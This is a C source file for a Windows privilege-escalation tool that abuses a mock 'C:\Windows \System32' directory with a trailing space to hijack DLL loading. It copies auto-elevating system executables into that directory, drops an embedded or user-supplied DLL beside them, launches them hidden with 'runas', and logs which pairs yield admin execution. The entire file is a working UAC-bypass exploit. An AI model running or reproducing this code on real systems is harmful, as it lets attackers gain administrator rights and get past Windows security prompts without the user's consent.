#include <windows.h>
#include <stdio.h>
#include "Header.h"
#include "resource.h"

#define DEBUG FALSE

const char* windowsFakePath = "C:\\Windows \\";
const char* system32FakePath = "C:\\Windows \\System32";

void printfDebug(const char* format, ...) {
#ifndef DEBUG
    va_list args;
    va_start(args, format);
    printf("\t");
    vprintf(format, args);
    va_end(args);
#endif
}

BOOL CheckExploit(char* exeName, char* dllName) {
    FILE* pFile;
    BOOL IsRunAsAdmin = FALSE;
    BOOL IsCurrentDll = FALSE;
    const char* logFile = "C:\\ProgramData\\exploit.txt";

    char *fileBuffer = (char*)malloc(MAX_PATH * 3);
    if (fileBuffer == NULL) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }

    if (fopen_s(&pFile, logFile, "r") != 0) {
        printfDebug("\t[-] Failed to open file %s\n", logFile);
        free(fileBuffer);
        return FALSE;
    }
    fscanf_s(pFile, "%i", &IsRunAsAdmin);
    fseek(pFile, 2, SEEK_SET);
    if (fgets(fileBuffer, MAX_PATH * 3, pFile) == NULL) {
        printfDebug("\t[-] Failed to read file %s\n", logFile);
        fclose(pFile);
        free(fileBuffer);
        return FALSE;
    }
    fclose(pFile);
    IsCurrentDll = (strstr(fileBuffer, exeName) != NULL && strstr(fileBuffer, dllName) != NULL);

    if (DeleteFileA(logFile))
        printfDebug("[-] Fail to cleanup log file: %s\n", logFile);
    free(fileBuffer);
    return IsRunAsAdmin && IsCurrentDll;
};


BOOL CreateFakeDirectory() {
    if (!CreateDirectoryA(windowsFakePath, NULL)) {
        int lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create directory: %s (%ld)\n", windowsFakePath, lastError);
            return FALSE;
        }
    }
    if (!CreateDirectoryA(system32FakePath, NULL)) {
        int lastError = GetLastError();
        if (lastError != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create directory: %s (%ld)\n", system32FakePath, lastError);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL CopyExeFile(char* system32Path, char* fileName) {
    char* fullPathInt = (char*)malloc(MAX_PATH);
    if (fullPathInt == NULL) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }
    char* fullPathOut = (char*)malloc(MAX_PATH);
    if (fullPathOut == NULL) {
        printf("[-] Failed to allocate memory\n");
        free(fullPathInt);
        return FALSE;
    }
    sprintf_s(fullPathInt, MAX_PATH, "%s\\%s", system32Path, fileName);
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    if (!CopyFileA(fullPathInt, fullPathOut, FALSE)) {
        printfDebug("[-] Failed to copy file %s (%ld)\n", fullPathOut, GetLastError());
        free(fullPathOut);
        free(fullPathInt);
        return FALSE;
    }
    printfDebug("[+] File copied: %s -> %s \n", fullPathInt, fullPathOut);

    free(fullPathOut);
    free(fullPathInt);
    return TRUE;
}
BOOL CopyDllFile(char* fileName, char* targetDll) {
    char* fullPathOut = (char*)malloc(MAX_PATH);
    if (fullPathOut == NULL) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    if (!CopyFileA(targetDll, fullPathOut, FALSE)) {
        printfDebug("[-] Failed to copy file %s (%ld)\n", fullPathOut, GetLastError());
        free(fullPathOut);
        return FALSE;
    }
    printfDebug("[+] File copied: %s -> %s \n", targetDll, fullPathOut);

    free(fullPathOut);
    return TRUE;
}
BOOL CopyDllFileResource(char* fileName, int resouceId, char* resouceName) {
    char* fullPathOut = (char*)malloc(MAX_PATH);
    HMODULE hMod;

    if (fullPathOut == NULL) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPathOut, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);

    hMod = GetModuleHandleA(NULL);
    if (hMod != NULL) {
        HRSRC res = FindResourceA(hMod, MAKEINTRESOURCEA(resouceId), resouceName);
        if (res != NULL) {
            DWORD dllSize = SizeofResource(hMod, res);
            void* dllBuff = LoadResource(hMod, res);
            HANDLE hDll = CreateFileA(fullPathOut, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, NULL);
            if (hDll != INVALID_HANDLE_VALUE) {
                DWORD sizeOut;
                WriteFile(hDll, dllBuff, dllSize, &sizeOut, NULL);
                CloseHandle(hDll);
                free(fullPathOut);
                printfDebug("[+] File dropped: %s \n", fullPathOut);
                return TRUE;
            } else {
                int lastError = GetLastError();
                if (lastError != 32) { // ERROR_SHARING_VIOLATION -> ERROR_ALREADY_EXISTS
                    printf("[-] Failed to create file: %s (%ld)\n", fullPathOut, lastError);
                    free(fullPathOut);
                    return FALSE;
                } else {
                    printfDebug("[+] File already exists: %s \n", fullPathOut);
                }
            }
        } else
            printf("[-] Fail to Find Resource DATA !\n");
    } else
        printf("[-] Fail to GetModuleHandleA !\n");
    free(fullPathOut);
    return FALSE;
}
BOOL Trigger(char* fileName) {
    SHELLEXECUTEINFOA sinfo = { 0 };

    char* fullPath = (char*)malloc(MAX_PATH);
    if (fullPath == NULL) {
        printf("[-] Failed to allocate memory\n");
        return FALSE;
    }
    sprintf_s(fullPath, MAX_PATH, "C:\\Windows \\System32\\%s", fileName);
    printfDebug("[+] Triggering: %s\n", fullPath);

    sinfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    sinfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
    sinfo.hwnd = NULL;
    sinfo.lpVerb = "runas";
    sinfo.lpFile = fullPath;
    sinfo.lpParameters = NULL;
    sinfo.lpDirectory = "C:\\Windows \\System32\\";
    sinfo.nShow = SW_HIDE;
    sinfo.hInstApp = NULL;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
        
    if (!ShellExecuteExA(&sinfo) || sinfo.hProcess == NULL) {
        printfDebug("[-] Failed to create process %ld\n", GetLastError());
        return FALSE;
    }
    if (WaitForSingleObject(sinfo.hProcess, 100) == WAIT_TIMEOUT) {
        printfDebug("[-] Process create timout (%s).\n", fileName);
        if(!TerminateProcess(sinfo.hProcess, 1))
            printfDebug("[-] Fail to terminate process (%s)!\n", fileName);
    }
    CloseHandle(sinfo.hProcess);

    free(fullPath);
    return TRUE;
}

BOOL RemoveFakeDirectory() {
    if (!RemoveDirectoryA(system32FakePath)) {
        printfDebug("[-] Failed to remove directory %ld\n", GetLastError());
        return FALSE;
    }
    if (!RemoveDirectoryA(windowsFakePath)) {
        printfDebug("[-] Failed to remove directory %ld\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}
BOOL CleanUpFakeDirectory(char* exeName, char* dllName) {
    char* bufferFilePath = (char*)malloc(MAX_PATH);
    if (bufferFilePath == NULL)
        return FALSE;

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, exeName);
    if (!DeleteFileA(bufferFilePath))
        printfDebug("[-] Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());

    sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, dllName);
    if (!DeleteFileA(bufferFilePath))
        printfDebug("[-] Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());
    free(bufferFilePath);
    return TRUE;
}
BOOL FullCleanUp() {
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA("C:\\Windows \\System32\\*.*", &fd);
    int iFailRemove = 0;

    if (hFind == INVALID_HANDLE_VALUE) {
        printfDebug("[-] Failed to find files in directory %s (%ld)\n", system32FakePath, GetLastError());
        return FALSE;
    }
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        char* bufferFilePath = (char*)malloc(MAX_PATH);
        if (bufferFilePath == NULL)
            return FALSE;
        sprintf_s(bufferFilePath, MAX_PATH, "%s\\%s", system32FakePath, fd.cFileName);
        if (!DeleteFileA(bufferFilePath)) {
            printfDebug("[-] Failed to delete file %s (%ld)\n", bufferFilePath, GetLastError());
            iFailRemove++;
        }
        free(bufferFilePath);
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    if(iFailRemove > 0)
        printf("[-] Failed to delete %i files (Need manual clean up)! \n", iFailRemove);
    RemoveFakeDirectory();
    return TRUE;
}
BOOL Exploit(char* TargetDll, char* exeName, char* dllName, char* system32Path) {
    CreateFakeDirectory();
    CopyExeFile(system32Path, exeName);
    if (TargetDll == NULL) {
#if _WIN64
        CopyDllFileResource(dllName, IDR_DATA2, "DATA_64"); // 32 - 64 
#else
        CopyDllFileResource(dllName, IDR_DATA1, "DATA_32"); // 32 - 64 
#endif
    } else
        CopyDllFile(dllName, TargetDll);
    Trigger(exeName);
    Sleep(100);
    CleanUpFakeDirectory(exeName, dllName);
    return CheckExploit(exeName, dllName);
}

VOID Banner() {
    printf("\n   ______ _      _        _   _ _____   ___  ___  _____  _   _______ _   _ _____ \n");
    printf("   |  _  \\ |    | |      | | | |_   _| |_  |/ _ \\/  __ \\| | / /_   _| \\ | |  __ \\\n");
    printf("   | | | | |    | |      | |_| | | |     | / /_\\ \\ /  \\/| |/ /  | | |  \\| | |  \\/\n");
    printf("   | | | | |    | |      |  _  | | |     | |  _  | |    |    \\  | | | . ` | | __ \n");
    printf("   | |/ /| |____| |____  | | | |_| |_/\\__/ / | | | \\__/\\| |\\  \\_| |_| |\\  | |_\\ \\\n");
    printf("   |___/ \\_____/\\_____/  \\_| |_/\\___/\\____/\\_| |_/\\____/\\_| \\_/\\___/\\_| \\_/\\____/\n\n\n");
}


int main(int argc, char** argv) {
    char* TargetDll = NULL;
    int iVulnPe = 0;
    int iTestPe = 0;

    Banner();
    if (argc == 2)
        TargetDll = argv[1];
    else if (argc > 2) {
        printf("[!] Invalid number of argument !\n\n");
        printf("%s [DLL_PATH]\n\n", argv[0]);
        return TRUE;
    }

    char* system32Path = (char*)malloc(sizeof(char) * MAX_PATH);
    if (system32Path == NULL) {
        printf("[-] Failed to allocate memory\n");
        return TRUE;
    }
    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
        printf("[-] Failed to get system directory\n");
        free(system32Path);
        return TRUE;
    }
    printf("[+] System directory: '%s'\n", system32Path);
    printf("[+] System fake directory: 'c:\\WINDOWS \\system32'\n\n");


    FILE* pFileLog;
    if (fopen_s(&pFileLog, "exploitable.log", "w") != 0) {
        printf("[-] Fail to open file exploitable.log (%ld)!\n", GetLastError());
        free(system32Path);
        return TRUE;
    }

    printf("[+] Running exploit:\n");
    for (int i = 0; i < sizeof(dllList) / sizeof(DllList); i++) {
        for (int j = 0; j < dllList[i].tableSize; j++) {
            if (Exploit((char*)TargetDll, (char*)dllList[i].name, (char*)dllList[i].dllTable[j], system32Path)) {
                printf("\t[*] Vulnerable: %s -> %s\n", dllList[i].name, dllList[i].dllTable[j]);
                fprintf(pFileLog, "1,%s,%s\n", dllList[i].name, dllList[i].dllTable[j]);
                iVulnPe++;
            } else
                fprintf(pFileLog, "0,%s,%s\n", dllList[i].name, dllList[i].dllTable[j]);
            iTestPe++;
        }
    }

    printf("\n[i] Number of test performe: %i/%i\n", iVulnPe, iTestPe);

    FullCleanUp();
    fclose(pFileLog);
    free(system32Path);
    return FALSE;
}